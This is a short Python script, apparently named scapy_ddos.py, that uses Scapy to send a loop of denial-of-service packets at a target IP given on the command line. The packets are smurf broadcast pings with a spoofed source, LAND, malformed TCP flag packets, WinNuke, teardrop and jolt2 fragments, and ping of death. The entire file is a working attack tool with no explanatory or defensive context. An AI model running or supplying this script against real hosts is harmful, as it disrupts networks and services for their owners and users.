#coding=utf8
from scapy.all import *
def help_info():
    print 'python scapy_ddos.py 1.1.1.1 num'
if len(sys.argv)<3:
    help_info()
else:
    i=1
    while not int(sys.argv[2]) or i<=int(sys.argv[2]):
        #smurf
        send(IP(src=sys.argv[1],dst='192.168.10.255')/ICMP())
        #landbase
        send(IP(src=sys.argv[1],dst=sys.argv[1])/TCP())
        #synflag
        send(IP(dst=sys.argv[1])/TCP(flags='SFR'))
        #winnuke
        send(IP(dst=sys.argv[1])/TCP(dport=139,flags='SU',urgptr=1))
        #teardrop
        send(IP(dst=sys.argv[1],id=42,flags="MF")/UDP()/('x'*10))
        send(IP(dst=sys.argv[1],id=42,frag=48)/('x'*116))
        send(IP(dst=sys.argv[1],id=42,flags="MF")/UDP()/('x'*224))
        #jolt2
        send(IP(dst=sys.argv[1],frag=65528)/UDP()/('x'*128))
        #ping of death
        sendp(fragment(Ether()/IP(dst=sys.argv[1])/ICMP()/('p'*65535)))
        i+=1
